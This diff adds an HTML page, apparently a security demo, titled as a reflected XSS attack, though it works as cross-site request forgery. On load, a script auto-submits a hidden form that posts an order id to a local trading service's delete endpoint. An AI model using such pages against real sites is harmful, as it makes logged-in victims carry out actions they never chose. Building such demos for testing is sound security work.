@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>反射型XSS攻击</title>
+	<meta charset="utf-8"/>
+</head>
+<body>
+<h1>
+	<!--<img src="">-->
+	<form id="myform" name="myform" action="http://localhost:2000/trade/order/delete" method="post" enctype="application/x-www-form-urlencoded">
+		<input name="id" value="2190011752599956492">
+	</form>
+</h1>
+<script type="text/javascript">
+	document.forms["myform"].submit();
+</script>
+</body>
+</html>
